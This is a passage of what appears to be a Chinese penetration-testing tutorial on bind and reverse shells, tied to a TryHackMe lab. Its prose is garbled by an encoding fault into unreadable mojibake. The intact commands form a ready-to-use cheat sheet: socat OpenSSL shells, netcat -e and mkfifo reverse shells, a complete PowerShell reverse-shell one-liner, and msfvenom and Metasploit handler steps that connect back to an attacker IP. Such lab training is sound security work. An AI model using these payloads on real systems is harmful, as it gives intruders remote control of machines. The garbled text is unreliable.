è¯·æ³¨æ„ï¼Œè¯ä¹¦å¿…é¡»åœ¨æ­£åœ¨ç›‘å¬çš„è®¾å¤‡ä¸Šä½¿ç”¨ï¼ˆå³ï¼šæœ‰ç›‘å¬å™¨çš„åœ°æ–¹å°±è¦æœ‰PEMæ–‡ä»¶ï¼‰ã€‚ è®¾ç½®å¥½ç›‘å¬å™¨åï¼Œä¸ºäº†å›è¿åˆ°è¯¥ç›‘å¬å™¨ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨: socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash åŠ å¯†ç»‘å®šshell å»ºç«‹åŠ å¯†çš„ç»‘å®š shell ä¹Ÿé‡‡ç”¨ å’Œä¸Šé¢åŒæ ·çš„æŠ€å·§: ç›®æ ‡æœºä¸Š socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes æ”»å‡»æœºä¸Š socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 - å†æ¬¡æ³¨æ„ï¼šå³ä½¿æ˜¯é’ˆå¯¹ Windows ç›®æ ‡æœºå»ºç«‹ç»‘å®šshellï¼Œè¯ä¹¦ä¹Ÿå¿…é¡»ä¸ç›‘å¬å™¨ä¸€èµ·ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦ä¸ºç»‘å®š shell å¤åˆ¶ PEM æ–‡ä»¶ã€‚ ä¸‹å›¾æ˜¾ç¤ºäº†æ¥è‡ª Linux ç›®æ ‡çš„ OPENSSL åå‘ shellï¼Œ å·¦è¾¹æ˜¯æ”»å‡»æœºç»ˆç«¯ç•Œé¢ï¼Œå³è¾¹æ˜¯å·²ç»å»ºç«‹çš„éäº¤äº’å¼åå‘shellç•Œé¢ï¼ˆå³è¾¹çš„listeneræ˜¯è‡ªå®šä¹‰çš„åˆ«åï¼‰ï¼š è¿™ç§åŠ å¯†æŠ€å·§ä¹Ÿé€‚ç”¨äºä¸Šä¸€ä¸ªå°èŠ‚ä¸­ä»‹ç»çš„ç‰¹æ®Šçš„ã€ä»…é™ Linux çš„ TTYï¼ˆç»ˆç«¯ï¼‰åå‘shell â€”â€” å¼„æ¸…æ¥šå®ƒçš„è¯­æ³•å°†æ˜¯æœ¬å°èŠ‚ç­”é¢˜çš„å…³é”®ã€‚ socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0 #å¯¹socat ttyæŠ€å·§çš„åŠ å¯†å¤„ç†--è®¾ç½®æ”»å‡»æœºä¸Šçš„ç›‘å¬å™¨ socat OPENSSL:10.10.10.5:53,verify=0 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane #å¯¹socat ttyæŠ€å·§çš„åŠ å¯†å¤„ç†--è®©ç›®æ ‡æœº 0x08 å¸¸ç”¨shell payload ä¹‹å‰æœ‰æåˆ°æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾ä¸€äº›æ–¹æ³•æ¥ä½¿ç”¨ netcat ä½œä¸ºç»‘å®š shell çš„ç›‘å¬å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†ä»å®ƒå¼€å§‹ã€‚ åœ¨ netcat çš„æŸäº›ç‰ˆæœ¬ä¸­ï¼ŒåŒ…æ‹¬Windows ç‰ˆçš„nc.exeï¼ˆKali Linuxä¹Ÿé™„å¸¦äº†ï¼Œä½äº /usr/share/windows-resources/binariesï¼‰ï¼Œè¿˜æœ‰ Kali æœ¬èº«ä½¿ç”¨çš„ç‰ˆæœ¬ï¼Œå³netcat-traditionalï¼Œéƒ½æœ‰ä¸€ä¸ª -e é€‰é¡¹å…è®¸ä½ åœ¨shellçš„è¿æ¥ä¸Šæ‰§è¡Œè¿›ç¨‹ã€‚ ä¾‹å¦‚ï¼Œåœ¨ç›®æ ‡æœºä¸Šè®¾ç½®ç›‘å¬å™¨æ—¶ï¼š nc -lvnp &lt;PORT&gt; -e /bin/bash ç”¨ netcat è¿æ¥åˆ°ä¸Šé¢çš„ç›‘å¬å™¨å°†åœ¨ç›®æ ‡ä¸Šäº§ç”Ÿä¸€ä¸ªç»‘å®š shellã€‚ åŒæ ·ï¼Œå¯¹äºåå‘ shellï¼Œåœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash ç›®æ ‡æœºå°†å›è¿æ”»å‡»æœºä¸Šçš„ç›‘å¬å™¨ï¼Œè¿™æ ·ä¼šäº§ç”Ÿä¸€ä¸ªåå‘ shellã€‚ ä½†æ˜¯ï¼Œå¤§å¤šæ•°ç‰ˆæœ¬çš„ netcat éƒ½ä¸åŒ…å«æ­¤åŠŸèƒ½ï¼ˆæŒ‡ -eé€‰é¡¹ï¼‰ï¼Œå› ä¸ºäººä»¬æ™®éè®¤ä¸ºå®ƒéå¸¸ä¸å®‰å…¨ã€‚ åœ¨å‡ ä¹æ€»æ˜¯éœ€è¦é™æ€äºŒè¿›åˆ¶æ–‡ä»¶çš„ Windowsç›®æ ‡æœºä¸Šï¼Œä»¥ä¸ŠæŠ€å·§ï¼ˆæŒ‡ -eé€‰é¡¹ï¼‰å°†å®Œç¾è¿è¡Œï¼›ç„¶è€Œï¼Œåœ¨ Linuxçš„ç›®æ ‡æœºä¸Šï¼Œæˆ‘ä»¬å°†æ”¹ä¸ºä½¿ç”¨ä»¥ä¸‹ä»£ç ä¸ºç»‘å®š shell åˆ›å»ºä¸€ä¸ªç›‘å¬å™¨ï¼š mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f #åœ¨linuxç›®æ ‡æœºä¸Šæ‰§è¡Œ ä»¥ä¸‹æ®µè½æ˜¯æ­¤å‘½ä»¤çš„æŠ€æœ¯è¯´æ˜â€”â€”å‘½ä»¤æœ¬èº«æ‰æ˜¯æœ€é‡è¦çš„ã€‚ è¯¥å‘½ä»¤é¦–å…ˆä¼šåœ¨ /tmp/f å¤„åˆ›å»ºå‘½åç®¡é“ï¼ˆFIFOâ€“First Inï¼ŒFirst Outï¼‰ï¼Œç„¶åå®ƒå¯åŠ¨ä¸€ä¸ª netcat ç›‘å¬å™¨ï¼Œå¹¶å°†ç›‘å¬å™¨çš„è¾“å…¥è¿æ¥åˆ°å‘½åç®¡é“çš„è¾“å‡ºã€‚netcat ç›‘å¬å™¨çš„è¾“å‡ºï¼ˆå³æˆ‘ä»¬å‘é€çš„å‘½ä»¤ï¼‰å†ç›´æ¥é€šè¿‡ç®¡é“ï¼ˆç®¡é“ç¬¦\" | \"ï¼‰ä¼ è¾“åˆ° shï¼Œå°† stderr è¾“å‡ºæµå‘é€åˆ° stdoutï¼Œå¹¶å°† stdout æœ¬èº«å‘é€åˆ°å‘½åç®¡é“çš„è¾“å…¥ï¼Œä»è€Œå®Œæˆå¾ªç¯ã€‚ å…³äºå‘½åç®¡é“çš„ä»‹ç»ï¼šhttps://www.linuxjournal.com/article/2156 ä¸€ä¸ªéå¸¸ç±»ä¼¼çš„å‘½ä»¤å¯ä»¥ç”¨æ¥å‘é€ netcat åå‘ shell: mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f #åœ¨linuxç›®æ ‡æœºä¸Šæ‰§è¡Œ è¿™ä¸ªå‘½ä»¤å®é™…ä¸Šä¸å‰ä¸€ä¸ªå‘½ä»¤ç›¸åŒï¼Œåªæ˜¯æ­¤å‘½ä»¤å°†ä½¿ç”¨ netcat ä¸»åŠ¨è¿æ¥è¯­æ³•ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ netcat ç›‘å¬è¯­æ³•ã€‚(ä¸‹å›¾ç¤ºä¾‹ä¸­çš„å·¦ä¾§ä½¿ç”¨äº†è‡ªå®šä¹‰åˆ«å) å½“ç›®æ ‡æ˜¯ä¸€ä¸ªç°ä»£çš„ Windows Server æ—¶ï¼Œå»ºç«‹ Powershell åå‘ shell æ˜¯éå¸¸å¸¸è§çš„ï¼Œå› æ­¤æˆ‘ä»¬å°†åœ¨è¿™é‡Œä»‹ç»æ ‡å‡†çš„ä¸€è¡Œ PSH åå‘ shellã€‚ è¿™ä¸ªå‘½ä»¤éå¸¸å¤æ‚ï¼Œå› æ­¤ä¸ºäº†ç®€å•èµ·è§ï¼Œè¿™é‡Œä¸ä¼šç›´æ¥è§£é‡Šå®ƒï¼Œè®°ä½ï¼Œè¿™æ˜¯ä¸€è¡Œéå¸¸æœ‰ç”¨çš„å‘½ä»¤: powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" ä¸ºäº†ä½¿ç”¨å®ƒï¼Œæˆ‘ä»¬éœ€è¦ç”¨é€‚å½“çš„ IP å’Œç«¯å£é€‰æ‹©æ¥æ›¿æ¢\"&lt;IP&gt;\" å’Œ â€œ&lt;port&gt;â€ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ° cmd.exe shellä¸­å¹¶æ‰§è¡Œè¯¥å‘½ä»¤ï¼ˆæˆ–è€…ä½¿ç”¨ åœ¨ Windows æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤çš„å¦ä¸€ç§æ–¹æ³•ï¼Œä¾‹å¦‚ webshellï¼‰ï¼Œä»è€Œç”Ÿæˆåå‘ shellï¼š å¯¹äºå…¶ä»–å¸¸è§çš„åå‘ shell æœ‰æ•ˆè½½è·ï¼Œå¯ä»¥å‚è€ƒgithubä¸Šçš„PayloadsAllTheThingså­˜å‚¨åº“ï¼Œå…¶ä¸­åŒ…å«äº†å¤šç§ä¸åŒè¯­è¨€çš„ shell ä»£ç ï¼ˆé€šå¸¸ä»¥å•è¡Œæ ¼å¼è¿›è¡Œå¤åˆ¶å’Œç²˜è´´ï¼‰ã€‚ PayloadAllTheThingsé¡¹ç›®é“¾æ¥ï¼š https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md 0x09 Msfvenomç”Ÿæˆshell payload Msfvenomä½œä¸º Metasploit æ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œä¸»è¦ç”¨äºç”Ÿæˆç”¨äºåå‘å’Œç»‘å®š shell çš„ä»£ç ã€‚ å®ƒè¢«å¹¿æ³›ç”¨äºå¼€å‘ä½ç­‰çº§çš„expï¼Œå¦‚ï¼šåœ¨å¼€å‘ç¼“å†²åŒºæº¢å‡ºæ¼æ´expæ—¶ç”Ÿæˆåå…­è¿›åˆ¶ shellcodeï¼›ä½†æ˜¯ï¼Œå®ƒä¹Ÿå¯ç”¨äºç”Ÿæˆå„ç§æ ¼å¼çš„æœ‰æ•ˆè´Ÿè½½ï¼ˆä¾‹å¦‚ .exeã€.aspxã€.warã€.pyï¼‰ã€‚ æˆ‘ä»¬å°†åœ¨æœ¬èŠ‚ä¸­ä½¿ç”¨Msfvenomçš„åä¸€ä¸ªåŠŸèƒ½ã€‚ msfvenom çš„æ ‡å‡†è¯­æ³•å¦‚ä¸‹ï¼š msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt; ä¾‹å¦‚ï¼Œè¦ä»¥ exe æ ¼å¼ç”Ÿæˆ Windows x64åå‘ Shellï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨: msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt; è¿™é‡Œæˆ‘ä»¬è®¾å®šä¸€ä¸ªæœ‰æ•ˆè½½è·æ¶‰åŠåˆ°å››ä¸ªå‚æ•°é€‰é¡¹: -f &lt;format&gt;:æŒ‡å®šè¾“å‡ºæ ¼å¼ã€‚ åœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œæ ¼å¼æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ (exe) -o &lt;file&gt;:ç”Ÿæˆçš„æœ‰æ•ˆè½½è·ï¼ˆpayloadï¼‰çš„è¾“å‡ºä½ç½®å’Œæ–‡ä»¶åã€‚ LHOST=&lt;IP&gt;:æŒ‡å®šè¦å›è¿çš„ IPï¼ˆå³æ”»å‡»æœºIPï¼‰ã€‚ å½“ä½ ä½¿ç”¨ TryHackMe çš„VPNè¿æ¥åˆ°ä½ è‡ªå·±çš„æ”»å‡»æœºæ—¶ï¼Œè¿™å°†æ˜¯ä½ çš„ tun0 IP åœ°å€ã€‚ LPORT=&lt;port&gt;:è¦å›è¿çš„æœ¬åœ°æ”»å‡»æœºä¸Šçš„ç«¯å£ã€‚ å¯ä»¥æ˜¯ 0 åˆ° 65535 ä¹‹é—´å°šæœªä½¿ç”¨çš„ä»»ä½•å€¼ï¼›ä½†æ˜¯è®¾å®šä¸ºä½äº 1024 çš„ç«¯å£æ—¶å°†å—åˆ°é™åˆ¶ï¼Œéœ€è¦ä»¥ root æƒé™è¿è¡Œç›‘å¬å™¨ã€‚ Staged vs Stagelessï¼ˆåˆ†æ®µå’Œä¸åˆ†æ®µï¼‰ åœ¨æˆ‘ä»¬è¿›ä¸€æ­¥è®¨è®ºä¹‹å‰ï¼Œå¿…é¡»ä»‹ç»å¦å¤–ä¸¤ä¸ªæ¦‚å¿µï¼šåˆ†æ®µçš„åå‘ shell æœ‰æ•ˆè´Ÿè½½ã€ä¸åˆ†æ®µçš„åå‘ shell æœ‰æ•ˆè´Ÿè½½ã€‚ åˆ†æ®µçš„åå‘shellæœ‰æ•ˆè½½è·åˆ†ä¸¤éƒ¨åˆ†å‘é€ã€‚ç¬¬ä¸€éƒ¨åˆ†ç§°ä¸ºstagerï¼Œè¿™æ˜¯ä¸€æ®µç›´æ¥åœ¨æœåŠ¡å™¨æœ¬èº«ä¸Šæ‰§è¡Œçš„ä»£ç ï¼Œå®ƒä¼šå›è¿æ”»å‡»æœºä¸Šç­‰å¾…çš„ç›‘å¬å™¨ï¼Œä½†å®ƒæœ¬èº«å¹¶ä¸åŒ…å«ä»»ä½•åå‘ shell ä»£ç ã€‚ç¬¬ä¸€éƒ¨åˆ†çš„stagerå°†è¿æ¥åˆ°ç›‘å¬å™¨å¹¶ä½¿ç”¨è¿æ¥æ¥åŠ è½½çœŸæ­£çš„æœ‰æ•ˆè½½è·ï¼Œè¿™æ ·èƒ½ç›´æ¥æ‰§è¡ŒçœŸæ­£çš„payloadå¹¶é˜²æ­¢çœŸæ­£çš„payloadæ¥è§¦åˆ°ç£ç›˜ï¼Œä»¥å…è¢«ä¼ ç»Ÿçš„åç—…æ¯’è§£å†³æ–¹æ¡ˆæ‹¦æˆªã€‚ å› æ­¤ï¼Œæ­¤ç±»æœ‰æ•ˆè½½è·åˆ†ä¸ºä¸¤éƒ¨åˆ†â€”â€”ä¸€ä¸ªå°çš„åˆå§‹æ®µï¼Œç„¶åæ˜¯åœ¨åˆå§‹æ®µå¯åŠ¨æ—¶æ‰€ä¸‹è½½çš„æ›´å¤§çš„åå‘ shell ä»£ç æ®µã€‚ åˆ†æ®µçš„æœ‰æ•ˆè½½è·éœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„ç›‘å¬å™¨â€”â€”é€šå¸¸æ˜¯Metasploit multi/handlerï¼Œè¿™å°†åœ¨ä¸‹ä¸€ä¸ªå°èŠ‚ä¸­ä»‹ç»ã€‚ ä¸åˆ†æ®µçš„åå‘shellæœ‰æ•ˆè½½è·æ›´å¸¸è§â€”â€”è¿™äº›ä¹Ÿæ˜¯æˆ‘ä»¬è¿„ä»Šä¸ºæ­¢ä¸€ç›´åœ¨ä½¿ç”¨çš„ã€‚ å®ƒä»¬æ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œå› ä¸ºåœ¨æˆåŠŸæ‰§è¡Œä¸€æ®µä»£ç æ—¶ä¼šç«‹å³å°† shell å‘é€å›æ”»å‡»æœºä¸Šç­‰å¾…çš„ç›‘å¬å™¨ã€‚ ä¸åˆ†æ®µçš„æœ‰æ•ˆè½½è·å¾€å¾€æ›´æ˜“äºä½¿ç”¨å’Œæ•è·ï¼› ä½†æ˜¯ï¼Œå®ƒä»¬ä¹Ÿæ›´åºå¤§ï¼Œå¹¶ä¸”æ›´å®¹æ˜“è¢«é˜²ç—…æ¯’æˆ–å…¥ä¾µæ£€æµ‹ç¨‹åºå‘ç°å’Œåˆ é™¤ã€‚ åˆ†æ®µçš„æœ‰æ•ˆè½½è·æ›´éš¾ä½¿ç”¨ï¼Œä½†å®ƒçš„åˆå§‹æ®µè¦çŸ­å¾—å¤šï¼Œæœ‰æ—¶ä¼šè¢«æ•ˆç‡è¾ƒä½çš„é˜²ç—…æ¯’è½¯ä»¶é—æ¼ã€‚ ç°ä»£é˜²ç—…æ¯’è§£å†³æ–¹æ¡ˆè¿˜å°†åˆ©ç”¨åæ¶æ„è½¯ä»¶æ‰«ææ¥å£ (AMSIï¼šAnti-Malware Scan Interface) æ¥æ£€æµ‹æœ‰æ•ˆè½½è·ï¼Œè¿™ä½¿å¾—åˆ†æ®µæœ‰æ•ˆè½½è·ä¸å¦‚ä»¥å‰é‚£ä¹ˆæœ‰æ•ˆã€‚ Meterpreterï¼ˆè‹±æ–‡æ„æ€æ˜¯ç¿»è¯‘å™¨ï¼‰ å…³äº Metasploitï¼Œå¦ä¸€ä¸ªè¦è®¨è®ºæ˜¯ Meterpreter shellã€‚ Meterpreter shell æ˜¯ Metasploitè‡ªå¸¦çš„çš„å…¨åŠŸèƒ½ shellï¼Œå®ƒä»¬æ˜¯å®Œå…¨ç¨³å®šçš„ï¼Œè¿™ä½¿å¾—å®ƒä»¬åœ¨é’ˆå¯¹Windows ç›®æ ‡æœºæ—¶æ•ˆæœéå¸¸å¥½ã€‚Meterpreter shell ä¹Ÿæœ‰å¾ˆå¤šè‡ªå·±çš„å†…ç½®åŠŸèƒ½ï¼Œä¾‹å¦‚æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ã€‚ å¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨Metasploit çš„åæ¸—é€å·¥å…·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å…ˆè·å¾—ä¸€ä¸ª Meterpreter shellã€‚ Meterpreter shell çš„ç¼ºç‚¹æ˜¯å®ƒä»¬å¿…é¡»åœ¨ Metasploitä¸­æ‰èƒ½æ•è·ï¼Œå®ƒä»¬ä¹Ÿè¢«æŸäº›è®¤è¯è€ƒè¯•ç¦æ­¢ä½¿ç”¨ï¼Œå› æ­¤å­¦ä¹ å…³äºMeterpreterçš„æ›¿ä»£æ–¹æ³•æ˜¯ä¸ªå¥½ä¸»æ„ã€‚ æœ‰æ•ˆè½½è·ï¼ˆpayloadï¼‰å‘½åçº¦å®š ä½¿ç”¨ msfvenom æ—¶ï¼Œäº†è§£å‘½åç³»ç»Ÿçš„å·¥ä½œåŸç†å¾ˆé‡è¦ï¼ŒåŸºæœ¬çš„payloadå‘½åçº¦å®šå¦‚ä¸‹ï¼š &lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt; ä¾‹å¦‚: linux/x86/shell_reverse_tcp è¿™å°†ä¸º x86 Linux çš„ç›®æ ‡æœºç”Ÿæˆä¸åˆ†æ®µçš„åå‘shell payloadã€‚ æ­¤åŸºæœ¬å‘½åçº¦å®šçš„ä¾‹å¤–æ˜¯Windows 32ä½æ“ä½œç³»ç»Ÿçš„ç›®æ ‡ï¼Œå¯¹äºè¯¥ç±»ç›®æ ‡ï¼Œå‘½åpayloadæ—¶ï¼Œä¸ä¼šæŒ‡å®šæ“ä½œç³»ç»Ÿçš„æ¶æ„ä½æ•°ï¼Œä¾‹å¦‚ï¼š windows/shell_reverse_tcp å¯¹äº64ä½çš„ Windows ç›®æ ‡ï¼Œå‘½åpayloadæ—¶ï¼Œarch å°†è¢«æŒ‡å®šä¸ºnormal (x64) ã€‚ æˆ‘ä»¬æŠŠå‘½åä¸­å…³äºpayloadçš„éƒ¨åˆ†å†ç»†åˆ†ä¸€ä¸‹ã€‚ åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨çš„payloadæ˜¯ shell_reverse_tcpï¼Œ è¿™è¡¨æ˜å®ƒæ˜¯ä¸€ä¸ªä¸åˆ†æ®µçš„payloadã€‚ä¸åˆ†æ®µçš„payloadä¼šç”¨ä¸‹åˆ’çº¿ (_) è¡¨ç¤ºï¼Œä¸æ­¤payloadç­‰æ•ˆçš„åˆ†æ®µpayloadæ˜¯ï¼šshell/reverse_tcpï¼ˆåˆ†æ®µpayloadä¼šç”¨ä¸€ä¸ªæ–œæ /è¡¨ç¤ºï¼‰ã€‚ è¿™äº›è§„åˆ™ä¹Ÿé€‚ç”¨äº Meterpreter payloadã€‚ä¸€ä¸ªé’ˆå¯¹Windows 64ä½ç›®æ ‡çš„åˆ†æ®µMeterpreter payload ï¼Œåç§°å°†å¦‚ä¸‹æ‰€ç¤ºï¼š windows/x64/meterpreter/reverse_tcp é’ˆå¯¹Linux 32ä½ç›®æ ‡çš„ä¸åˆ†æ®µ Meterpreter payloadï¼Œåç§°å°†å¦‚ä¸‹æ‰€ç¤ºï¼š linux/x86/meterpreter_reverse_tcp é™¤äº† msfconsole æ‰‹å†Œé¡µä¹‹å¤–ï¼Œä½¿ç”¨ msfvenom æ—¶è¦æ³¨æ„çš„å¦ä¸€ä¸ªå‘½ä»¤æ˜¯ï¼šmsfvenom --list payloadsï¼Œè¿™å¯ç”¨äºåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æœ‰æ•ˆè½½è·ï¼Œç„¶åå¯ä»¥å°†å…¶é€šè¿‡ç®¡é“ç¬¦ä¼ è¾“åˆ° grep ä»¥æœç´¢ä¸€ç»„ç‰¹å®šçš„æœ‰æ•ˆè½½è·ï¼Œä¾‹å¦‚ï¼š è¿™ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€æ•´å¥—é’ˆå¯¹ Linux 32ä½ç›®æ ‡çš„ Meterpreter æœ‰æ•ˆè½½è·ã€‚ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell lhost=10.10.10.5 lport=443 0x10 Metasploit multi/handleræ¨¡å— Multi/Handler æ˜¯æ•è·åå‘ shell çš„ç»ä½³å·¥å…·ï¼ˆmulti/handleræ¨¡å—å……å½“çš„æ˜¯è¿æ¥shellçš„ç›‘å¬å™¨ï¼‰ï¼Œå¦‚æœä½ æƒ³ä½¿ç”¨ Meterpreter shellï¼Œè¿™æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå¹¶ä¸”è¿™ä¹Ÿæ˜¯ä½¿ç”¨åˆ†æ®µpayloadæ—¶çš„é¦–é€‰ã€‚ å¹¸è¿çš„æ˜¯ï¼Œå®ƒç›¸å¯¹å®¹æ˜“ä½¿ç”¨: ä½¿ç”¨\" msfconsole \"å‘½ä»¤å¯åŠ¨Metasploit è¾“å…¥\" use multi/handler \"å‘½ä»¤ï¼ŒæŒ‰ä¸‹å›è½¦é”® æˆ‘ä»¬ç°åœ¨å‡†å¤‡å¼€å§‹ä¸€ä¸ªmulti/handlerä¼šè¯ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ options å‘½ä»¤æŸ¥çœ‹å¯ç”¨çš„é€‰é¡¹: æˆ‘ä»¬éœ€è¦è®¾ç½®ä¸‰ä¸ªé€‰é¡¹ï¼špayloadã€LHOST å’Œ LPORTã€‚ è¿™äº›éƒ½ä¸æˆ‘ä»¬åœ¨ä½¿ç”¨ Msfvenom ç”Ÿæˆ shellcode æ—¶è®¾ç½®çš„é€‰é¡¹ç›¸åŒâ€”â€”ç‰¹å®šäºæˆ‘ä»¬çš„ç›®æ ‡çš„payloadï¼Œä»¥åŠæˆ‘ä»¬å¯ä»¥æ¥æ”¶ shell çš„ç›‘å¬IPåœ°å€å’Œç«¯å£ã€‚ è¯·æ³¨æ„ï¼Œåœ¨æ­¤å¤„å¿…é¡»æŒ‡å®š LHOSTï¼Œå› ä¸º metasploit ä¸ä¼šåƒ netcat æˆ– socat é‚£æ ·ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£ï¼› æ‰€ä»¥ä½ å¿…é¡»å‘Šè¯‰å®ƒä¸€ä¸ªç‰¹å®šçš„åœ°å€ä»¥ä¾¿è¿›è¡Œç›‘å¬ï¼ˆä½¿ç”¨ TryHackMe æ—¶ï¼Œè¿™å°†æ˜¯ä½ çš„ tun0 åœ°å€ï¼‰ã€‚ æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®è¿™äº›é€‰é¡¹ï¼š set PAYLOAD &lt;payload&gt; set LHOST &lt;listen-address&gt; set LPORT &lt;listen-port&gt; æˆ‘ä»¬ç°åœ¨åº”è¯¥å·²ç»å‡†å¤‡å¥½å¼€å§‹ç›‘å¬äº†ï¼ è®©æˆ‘ä»¬é€šè¿‡ä½¿ç”¨\" exploit -j \"å‘½ä»¤ï¼Œè¿™å°†å‘Šè¯‰ Metasploit å¯åŠ¨æ¨¡å—å¹¶å°†å…¶ä½œä¸ºä½œä¸šï¼ˆjobï¼‰åœ¨åå°è¿è¡Œ ä½ å¯èƒ½æ³¨æ„åˆ°åœ¨ä¸Šé¢çš„æˆªå›¾ä¸­ï¼ŒMetasploit æ­£åœ¨ç›‘å¬ä¸€ä¸ª1024ä»¥ä¸‹çš„ç«¯å£ã€‚ä¸ºæ­¤ï¼ŒMetasploit å¿…é¡»ä½¿ç”¨ sudo æƒé™è¿è¡Œã€‚ å½“åœ¨å‰é¢çš„msfvenomä¸­ç”Ÿæˆçš„åˆ†æ®µpayloadå¼€å§‹è¿è¡Œæ—¶ï¼ŒMetasploit å°†æ¥æ”¶è¿æ¥ï¼Œå¹¶ä¼šå‘é€å‰©ä½™çš„payloadç„¶åç»™æˆ‘ä»¬æä¾›ä¸€ä¸ªåå‘ shell: è¯·æ³¨æ„ï¼Œå› ä¸ºåœ¨ä¸Šé¢çš„æ¡ˆä¾‹ä¸­multi/handler å¼€å§‹æ˜¯åœ¨åå°å¤„ç†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨ \" sessions 1 â€œå‘½ä»¤å†æ¬¡å°†å…¶ç½®äºå‰å°ã€‚ è¿™å¾ˆæœ‰æ•ˆï¼Œå› ä¸ºå®ƒæ˜¯å”¯ä¸€è¿è¡Œçš„ä¼šè¯ã€‚ å¦‚æœè¿˜æœ‰å…¶ä»–æ´»åŠ¨çš„ä¼šè¯ï¼Œæˆ‘ä»¬å°†éœ€è¦ä½¿ç”¨â€ sessions \"å‘½ä»¤æ¥æŸ¥çœ‹æ‰€æœ‰æ´»åŠ¨çš„ä¼šè¯ï¼Œç„¶åä½¿ç”¨sessions &lt;number&gt;å‘½ä»¤æ¥é€‰æ‹©é€‚å½“çš„ä¼šè¯ç½®äºå‰å°ã€‚ è¿™ä¸ªæ•°å­—ä¹Ÿå°†æ˜¾ç¤ºåœ¨æ‰“å¼€ shell çš„è¡Œä¸­ï¼ˆä½ èƒ½çœ‹åˆ°â€œCommand Shell session 1 opened â€ï¼‰ã€‚ 0x11 webshellä»‹ç» æœ‰æ—¶æˆ‘ä»¬ä¼šé‡åˆ°å…è®¸æˆ‘ä»¬ä»¥æŸç§æ–¹å¼ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶çš„ç½‘ç«™ã€‚ ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šåˆ©ç”¨è¿™ä¸ªæœºä¼šä¸Šä¼ å¯ä»¥æ¿€æ´»åå‘shellæˆ–ç»‘å®š shell çš„ä»£ç ï¼Œä½†æœ‰æ—¶è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚ æ‰€ä»¥åœ¨éç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†æ”¹ä¸ºä¸Šä¼  webshellã€‚ï¼ˆè¯·å‚é˜…æˆ‘ä¹‹å‰å†™çš„å…³äºä¸Šä¼ æ¼æ´çš„åšå®¢æ–‡ç« ï¼Œä»¥æ›´å¹¿æ³›åœ°äº†è§£æ­¤æ¦‚å¿µï¼‰ â€œWebshellâ€æ˜¯ä¸€ä¸ªé€šä¿—çš„æœ¯è¯­ï¼Œç”¨äºæŒ‡ä»£åœ¨ç½‘ç»œæœåŠ¡å™¨ï¼ˆé€šå¸¸ä½¿ç”¨ PHP æˆ– ASP ç­‰è¯­è¨€ï¼‰ä¸­è¿è¡Œçš„è„šæœ¬ï¼Œè¯¥è„šæœ¬èƒ½åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»£ç ã€‚æœ¬è´¨ä¸Šï¼Œå‘½ä»¤è¢«è¾“å…¥åˆ°ç½‘é¡µä¸­â€”â€”é€šè¿‡ HTML è¡¨å•ï¼Œæˆ–è€…ç›´æ¥ä½œä¸º URL 